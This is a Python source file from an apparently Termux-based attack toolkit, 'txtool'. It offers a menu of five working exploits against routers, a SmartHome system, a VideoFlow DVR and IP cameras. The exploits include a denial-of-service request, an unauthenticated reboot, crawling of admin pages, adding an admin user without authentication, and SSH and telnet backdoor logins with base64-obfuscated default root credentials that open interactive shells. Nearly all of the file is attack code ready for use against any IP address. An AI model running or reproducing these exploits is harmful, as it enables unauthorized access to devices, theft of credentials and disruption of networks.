#!/data/data/com.termux/files/usr/bin/python2
# -*- coding: utf-8 -*-

import sys, socket, os, time, telnetlib
from base64 import b64decode as xxxx
sys.path.append('/data/data/com.termux/files/usr/share/txtool/core')
from fungsi import warna, IP, ipv4, finish_exploit, ssh_shell, txtool_dir
import sub_menu4 as BACK

try:
    import requests

except ImportError:
    print(warna.merah + "\n[x] " + warna.tutup + "Error, please install requests module. ($ pip2 install requests)\n")

def empty():
    try:
        print(warna.kuning + "\n[!] " + warna.tutup + "Warning. your input is empty, txtool will be assume exploitation is canceled")
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")

    except KeyError:
        pass

def exploit1():
    """
Exploit Author: Enrique Castillo
source: https://www.exploit-db.com/exploits/43147/

"""
    IP()
    print(warna.kuning + "\n[!]" + warna.tutup + " Firmware versions 2.08UI and lower contain a bug in the function that handles HTTP GET requests for directory paths that can allow an unauthenticated attacker to cause complete denial of service (device reboot). This bug can be triggered from both LAN and WAN.")
    print(warna.kuning + "[!]" + warna.tutup + " CVE: CVE-2017-9675\n")
    target = raw_input(warna.biru + "\n[+]" + warna.tutup + " ip address of Router device" + warna.kuning + "  >>  " + warna.tutup)
#    true_ip = ipv4(target)
    if target == '':
        empty()
        BACK.menu['menu_utama']()

#    elif not true_ip:
#        print(warna.merah + "\n[x] " + warna.tutup + "Warning. wrong ip address, txtool will be assume exploitation is canceled")
#        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
#        BACK.menu['menu_utama']()

    else:
        os.system("curl -v http://%s/Tools/" % (target))
        print(warna.hijau + "\n[*] " + warna.tutup + "Exploitation finished !!!")
        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
        BACK.menu['menu_utama']()

def exploit2():
    '''
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience
source: https://www.exploit-db.com/exploits/43402/
Writen in python by Kuburan

'''
    IP()
    print("\n\t[" + warna.hijau + "1" + warna.tutup + "]" + warna.abuabu + "  Denial Of Service" + warna.tutup)
    print("\t[" + warna.hijau + "2" + warna.tutup + "]" + warna.abuabu + "  Information Disclosure" + warna.tutup)
    print("\t[" + warna.hijau + "0" + warna.tutup + "]" + warna.abuabu + "  Back" + warna.tutup)
    choise = raw_input(warna.biru + "\n[+]" + warna.tutup + " Select An action" + warna.kuning + "  >>  " + warna.tutup)
    if choise == '':
        empty()
        BACK.menu['menu_utama']()


    if choise == '1':
        print(warna.kuning + "\n[!]" + warna.tutup + " The router suffers from an unauthenticated reboot command execution. Attackers can exploit this issue to cause a denial of service scenario.")
        print(warna.kuning + "[!]" + warna.tutup + " Affected version:\n\tFwVer: SDT-CS3B1, sw version 1.2.0\n\tLteVer: ML300S5XEA41_090 1 0.1.0\n\tModem model: PM-L300S")
        target = raw_input(warna.biru + "\n[+]" + warna.tutup + " ip address of Router device" + warna.kuning + " >> " + warna.tutup)
        true_ip = ipv4(target)
        if target == '':
            empty()
            BACK.menu['menu_utama']()

        if not true_ip:
            print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

        port = raw_input(warna.biru + "\n[+]" + warna.tutup + " port of Router device" + warna.kuning + " >> " + warna.tutup)
        if port == '':
            empty()
            BACK.menu['menu_utama']()

        else:
            try:
                print warna.hijau + "\n[*] " + warna.tutup + "Sending reboot command..."
                site = ("http://%s:%s/cgi-bin/lte.cgi?Command=Reboot" % (target, port))
                req = requests.get(site)
                body = req.content
                print warna.hijau + "\n[*] " + warna.tutup + body
                if "<xml>\n</xml>" in body:
                    print warna.hijau + "[*] " + warna.tutup + "Router should be rebooted."
                    finish_exploit()
                    BACK.menu['menu_utama']()

                else:
                    print warna.kuning + "[!] " + warna.tutup + "maybe attack unsuccessfull."
                    raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
                    BACK.menu['menu_utama']()

            except requests.exceptions.RequestException as err:
                print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,err
                raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
                BACK.menu['menu_utama']()

            except KeyError:
                pass


    elif choise == '2':
        print(warna.kuning + "\n[!]" + warna.tutup + " Insecure direct object references occured when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources and functionalities in the system.")
        print(warna.kuning + "[!]" + warna.tutup + " Affected version:\n\tFwVer: SDT-CS3B1, sw version 1.2.0\n\tLteVer: ML300S5XEA41_090 1 0.1.0\n\tModem model: PM-L300S")
        target = raw_input(warna.biru + "\n[+]" + warna.tutup + " ip address of Router device" + warna.kuning + "  >>  " + warna.tutup)
        true_ip = ipv4(target)
        if target == '':
            empty()
            BACK.menu['menu_utama']()

        if not true_ip:
            print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

        else:
            while True:
                url1 = ("http://%s/nas/smbsrv.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get Samba server settings information...")
                    page1 = requests.get(url1, timeout=10)
                    ok = page1.status_code
                    page1.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page1.status_code
                    if ok:
                        os.system("mkdir -p /data/data/com.termux/files/home/.txtool/%s" % target)
                        os.system("""echo "http://%s/nas/smbsrv.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as a:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,a
                    pass

                url2 = ("http://%s/nas/ftpsrv.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get FTP settings information...")
                    page2 = requests.get(url2, timeout=10)
                    ok = page2.status_code
                    page2.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page2.status_code
                    if ok:
                        os.system("""echo "http://%s/nas/ftpsrv.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as b:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,b
                    pass

                url3 = ("http://%s/wifi2g/basic.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get Wireless settings information...")
                    page3 = requests.get(url3, timeout=10)
                    ok = page3.status_code
                    page3.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page3.status_code
                    if ok:
                        os.system("""echo "http://%s/wifi2g/basic.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as c:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,c
                    pass

                url4 = ("http://%s/admin/status.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get Access point status information...")
                    page4 = requests.get(url4, timeout=10)
                    ok = page4.status_code
                    page4.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page4.status_code
                    if ok:
                        os.system("""echo "http://%s/admin/status.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as d:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,d
                    pass

                url5 = ("http://%s/internet/wan.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get WAN settings information...")
                    page5 = requests.get(url5, timeout=10)
                    ok = page5.status_code
                    page5.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page5.status_code
                    if ok:
                        os.system("""echo "http://%s/internet/wan.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as e:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,e
                    pass

                url6 = ("http://%s/internet/lan.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get LAN settings information...")
                    page6 = requests.get(url6, timeout=10)
                    ok = page6.status_code
                    page6.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page6.status_code
                    if ok:
                        os.system("""echo "http://%s/internet/lan.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as f:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,f
                    pass

                url7 = ("http://%s/admin/statistic.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get System statistics information...")
                    page7 = requests.get(url7, timeout=10)
                    ok = page7.status_code
                    page7.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page7.status_code
                    if ok:
                        os.system("""echo "http://%s/admin/statistic.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as g:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,g
                    pass

                url8 = ("http://%s/admin/management.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get System management information...")
                    page8 = requests.get(url8, timeout=10)
                    ok = page8.status_code
                    page8.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page8.status_code
                    if ok:
                        os.system("""echo "http://%s/admin/management.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as h:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,h
                    pass

                url9 = ("http://%s/serial/serial_direct.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get Direct serial settings information...")
                    page9 = requests.get(url9, timeout=10)
                    ok = page9.status_code
                    page9.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page9.status_code
                    if ok:
                        os.system("""echo "http://%s/serial/serial_direct.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as i:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,i
                    pass

                url10 = ("http://%s/admin/system_command.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get System command interface...")
                    page10 = requests.get(url10, timeout=10)
                    ok = page10.status_code
                    page10.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page10.status_code
                    if ok:
                        os.system("""echo "http://%s/admin/system_command.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as j:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,j
                    pass

                url11 = ("http://%s/internet/dhcpcliinfo.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get DHCP Clients information...")
                    page11 = requests.get(url11, timeout=10)
                    ok = page11.status_code
                    page11.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page11.status_code
                    if ok:
                        os.system("""echo "http://%s/internet/dhcpcliinfo.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as k:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,k
                    pass

                url12 = ("http://%s/admin/upload_firmware.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get Router firmware information...")
                    page12 = requests.get(url12, timeout=10)
                    ok = page12.status_code
                    page12.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page12.status_code
                    if ok:
                        os.system("""echo "http://%s/admin/upload_firmware.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as l:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,l
                    pass

                url13 = ("http://%s/firewall/vpn_futuresystem.shtml" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get VPN settings information...")
                    page13 = requests.get(url13, timeout=10)
                    ok = page13.status_code
                    page13.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page13.status_code
                    if ok:
                        os.system("""echo "http://%s/firewall/vpn_futuresystem.shtml" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as m:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,m
                    pass

                url14 = ("http://%s/cgi-bin/lte.cgi?Command=getUiccState" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get GetUiccState() information...")
                    page14 = requests.get(url14, timeout=10)
                    ok = page14.status_code
                    page14.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page14.status_code
                    if ok:
                        os.system("""echo "http://%s/cgi-bin/lte.cgi?Command=getUiccState" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as n:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,n
                    pass

                url15 = ("http://%s/cgi-bin/lte.cgi?Command=getModemStatus" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get Modem status information...")
                    page15 = requests.get(url15, timeout=10)
                    ok = page15.status_code
                    page15.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page15.status_code
                    if ok:
                        os.system("""echo "http://%s/cgi-bin/lte.cgi?Command=getModemStatus" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                except requests.exceptions.RequestException as o:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,o
                    pass

                url16 = ("http://%s/cgi-bin/systemutil.cgi?Command=SystemInfo" % (target))
                try:
                    print(warna.hijau + "\n[*] " + warna.tutup + "Attempt to get System information...")
                    page16 = requests.get(url16, timeout=10)
                    ok = page16.status_code
                    page16.raise_for_status()
                    print warna.hijau + "\n[*] " + warna.tutup + "Status:" ,page16.status_code
                    if ok:
                        os.system("""echo "http://%s/cgi-bin/systemutil.cgi?Command=SystemInfo" >> /data/data/com.termux/files/home/.txtool/%s/target.txt""" % (target, target))
                        break
                except requests.exceptions.RequestException as p:
                    print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,p
                    print warna.merah + "\n[x] " + warna.tutup + "To many error occured, finish crawling."
                    raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
                    BACK.menu['menu_utama']()

            print(warna.hijau + "\n[*] " + warna.tutup + "Crawl result has been saved to $HOME/.txtool/%s/target.txt" % (target))
            finish_exploit()
            BACK.menu['menu_utama']()

    elif choise == '0':
        BACK.menu['menu_utama']()

    else:
        print warna.merah + "\n[x] " + warna.tutup + "Wrong command."
        BACK.menu['menu_utama']()

def exploit3():
    try:
        IP()
        print(warna.kuning + "\n[!]" + warna.tutup + " the Vulnerability allow unauthenticated attacker to remotely bypass authentication and added new user.")
        print(warna.kuning + "[!]" + warna.tutup + " Affected version : 4.20 and older")
        target = raw_input(warna.biru + "\n[+]" + warna.tutup + " ip address of SmartHome device" + warna.kuning + "  >>  " + warna.tutup)
        true_ip = ipv4(target)
        if target == '':
            empty()
            BACK.menu['menu_utama']()

        if not true_ip:
            print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

        port = '9000'
        print(warna.kuning + "\n[!]" + warna.tutup + " Make your own username")
        user = raw_input(warna.biru + "[+]" + warna.tutup + " Username" + warna.kuning + "  >>  " + warna.tutup)
        if user == '':
            empty()
            BACK.menu['menu_utama']()

        print(warna.kuning + "\n[!]" + warna.tutup + " Make your own password")
        password = raw_input(warna.biru + "[+]" + warna.tutup + " Password" + warna.kuning + "  >>  " + warna.tutup)
        if password == '':
            empty()
            BACK.menu['menu_utama']()

        url = ("http://%s:%s/content/new_user.php?user_name=%s&password=%s&group_id=1" %
              (target, port, user, password))
        req = requests.get(url, timeout=10)
        req.status_code
        req.raise_for_status()
        if req.ok:
            print(warna.hijau + "\n[*] " + warna.tutup + "Successfully added new users")
            print("\n    username   : %s" % (user))
            print("    password   : %s" % (password))
            print("    login page : http://%s:%s/content/smarthome.php" % (target, port))
            finish_exploit()
            BACK.menu['menu_utama']()

        else:
            print(warna.merah + "\n[x] " + warna.tutup + "Failed to add new users, it looks like your target is not a SmartHome System")
            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

    except requests.exceptions.HTTPError as error_1:
        print warna.merah + "\n[x]" + warna.tutup + " Http Error : ", error_1
        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
        BACK.menu['menu_utama']()

    except requests.exceptions.ConnectionError as error_2:
        print warna.merah + "\n[x]" + warna.tutup + " Error Connecting : ", error_2
        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
        BACK.menu['menu_utama']()

    except requests.exceptions.Timeout as error_3:
        print warna.merah + "\n[x]" + warna.tutup + " Timeout Error : ", error_3
        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
        BACK.menu['menu_utama']()

    except requests.exceptions.RequestException as err:
        print warna.merah + "\n[x]" + warna.tutup, err
        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
        BACK.menu['menu_utama']()

def exploit4():
    try:
        import paramiko
    except ImportError:
        print(warna.merah + "\n[x] " + warna.tutup + "Error, please install paramiko module. ($ pip2 install paramiko)\n")
        sys.exit()

    from paramiko.ssh_exception import BadHostKeyException, AuthenticationException, SSHException

    IP()
    print(warna.kuning + "\n[!]" + warna.tutup + " VideoFlow Digital Video Protection DVP 10 Authenticated Remote Code Execution")
    print(warna.kuning + "[!]" + warna.tutup + " Affected version : 2.10 (X-Prototype-Version: 1.6.0.2)")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    y = xxxx(b'cm9vdA==')
    z = xxxx(b'dmlkZW9mbG93')
    _host = raw_input(warna.biru + "\n[+]" + warna.tutup + " Target ip address" + warna.kuning + "  >>  " + warna.tutup)
    paramiko.util.log_to_file("%s/%s.log" % (txtool_dir, _host))
    _user = [y,
             """mom"""]
    _connection = None
    p = [z,
         """$1$CGgdGXXG$0FmyyKMzcHgkKnUTZi5r./"""]
    _passwords = [line.strip() for line in p]
    _username = [line.strip() for line in _user]
    _retries = range(len(_passwords and _username))
    true_ip = ipv4(_host)
    if _host == '':
        empty()
        BACK.menu['menu_utama']()

    if not true_ip:
        print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
        BACK.menu['menu_utama']()

    print(warna.hijau + "\n[*] " + warna.tutup + "Trying to login...")
    for _pass in _passwords:
        for _u in _username:
            try:
                for x in _retries:
                    ssh.connect(_host, username=_u, password=_pass, timeout=5)
                    _connection = True
                if _connection:
                    print(warna.hijau + "[*] " + warna.tutup + "Login Success! user: "+_u+" and password: "+_pass)
                    command = ssh.invoke_shell()
                    print(repr(ssh.get_transport()))
                    print(warna.hijau + "[*] " + warna.tutup + "shell has been successfully opened\n")
                    ssh_shell(command)
                    command.close()
                    ssh.close()
                    finish_exploit()
                    BACK.menu['menu_utama']()

            except (BadHostKeyException, AuthenticationException,
                     SSHException, socket.error) as err:
                print warna.merah + "[x] " + warna.tutup + "An error occured:" ,err
                time.sleep(1)

    print(warna.merah + "\n[x] " + warna.tutup + "Failed to login, maybe target not vuln")
    raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
    BACK.menu['menu_utama']()

def exploit5():
    try:
        from bs4 import BeautifulSoup

    except ImportError:
        print(warna.merah + "\n[x] " + warna.tutup + "Error, please install bs4 module. ($ pip2 install bs4)\n")
        sys.exit()

    IP()
    print(warna.kuning + "\n[!]" + warna.tutup + " Vendor: Master IP CAM" + warna.tutup)
    print(warna.kuning + "[!]" + warna.tutup + " Affected Version: 3.3.4.2103" + warna.tutup)
    print("\n\t[" + warna.hijau + "1" + warna.tutup + "]" + warna.abuabu + " Sensitive Information Disclousure" + warna.tutup)
    print("\t[" + warna.hijau + "2" + warna.tutup + "]" + warna.abuabu + " telnet Backdoor Access" + warna.tutup)
    print("\t[" + warna.hijau + "0" + warna.tutup + "]" + warna.abuabu + " Back" + warna.tutup)
    select = raw_input(warna.biru + "\n[+]" + warna.tutup + " Select An action" + warna.kuning + "  >>  " + warna.tutup)
    if select == '':
        empty()
        BACK.menu['menu_utama']()

    if select == '1':
        try:
            print(warna.kuning + "\n[!]" + warna.tutup + " Host or ip address" + warna.tutup)
            t = raw_input(warna.biru + "[+]" + warna.tutup + " Target" + warna.kuning + "  >>  " + warna.tutup)
            if t == '':
                empty()
                BACK.menu['menu_utama']()

            print(warna.hijau + "\n[*] " + warna.tutup + "trying to collect sensitive information...")
            time.sleep(1)
            url = "http://%s/web/cgi-bin/hi3510/param.cgi?cmd=getuser" % (t)
            header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'}
            req = requests.get(url, headers=header, timeout=10)
            req.raise_for_status()
            soup = BeautifulSoup(req.content, "html.parser")
            for script in soup(["script", "style"]):
                script.decompose()
            text = soup.get_text()
            lines = (line.strip() for line in text.splitlines())
            chunks = (phrase.strip("var" ";") for line in lines for phrase in line.split(" var "))
            text = '\n'.join(chunk for chunk in chunks if chunk)
            clear_text = text.encode(sys.stdout.encoding)
            print(clear_text)
            os.system("""mkdir -p %s/%s""" % (txtool_dir, t))
            f = open(txtool_dir + "/%s/juicy_info.txt" % (t), "w")
            f.write(clear_text + "\nLogin page : http://%s/web/index.html\n" % (t))
            f.close()
            print(warna.hijau + "[*] " + warna.tutup + "Login page : http://%s/web/index.html" % (t))
            print(warna.hijau + "\n[*] " + warna.tutup + "sensitive information has been saved to ~/.txtool/%s/juicy_info.txt" % (t))
            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

        except requests.exceptions.RequestException as er:
            print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,er
            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

        except requests.exceptions.HTTPError as er_1:
            print warna.merah + "\n[x]" + warna.tutup + " Http Error : ", er_1
            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

        except requests.exceptions.ConnectionError as er_2:
            print warna.merah + "\n[x]" + warna.tutup + " Error Connecting : ", er_2
            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

        except requests.exceptions.Timeout as er_3:
            print warna.merah + "\n[x]" + warna.tutup + " Timeout Error : ", er_3
            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

    if select == '2':
        print(warna.kuning + "\n[!]" + warna.tutup + " Host or ip address" + warna.tutup)
        _host = raw_input(warna.biru + "[+]" + warna.tutup + " Target" + warna.kuning + "  >>  " + warna.tutup)
        if _host == '':
            empty()
            BACK.menu['menu_utama']()

        print(warna.hijau + "\n[*] " + warna.tutup + "Trying to login...")
        time.sleep(1)
        try:
            _user = xxxx(b'cm9vdA==')
            _password = xxxx(b'Y2F0MTAyOQ==')
            tel_conn = telnetlib.Telnet(_host, timeout=10)
            tel_conn.expect(["RT-IPC login: "], 10)
            tel_conn.write(_user + "\n")
            tel_conn.expect(["Password: ", "password"], 10)
            tel_conn.write(_password + "\n")
            (i, obj, res) = tel_conn.expect(["Incorrect", "incorrect"], 10)
            if i != -1:
                print(warna.merah + "\n[x]" + warna.tutup + " login failed")
                raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
                BACK.menu['menu_utama']()

            else:
                if any(map(lambda x: x in res, ["#", "$", ">"])):
                    print(warna.hijau + "\n[*] " + warna.tutup + "shell has been successfully opened")
                    tel_conn.write("\n")
                    tel_conn.interact()
                    print(warna.merah + "\n[x]" + warna.tutup + " shell closed")
                    tel_conn.close()
                    raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue")
                    BACK.menu['menu_utama']()

        except socket.error as a:
            print warna.merah + "\n[x] " + warna.tutup + "socket error : ", a
            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

        except socket.timeout as b:
            print warna.merah + "\n[x] " + warna.tutup + "socket timeout : ", b
            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
            BACK.menu['menu_utama']()

    elif select == '0':
        BACK.menu['menu_utama']()

    else:
        print warna.merah + "\n[x] " + warna.tutup + "Wrong command."
        BACK.menu['menu_utama']()
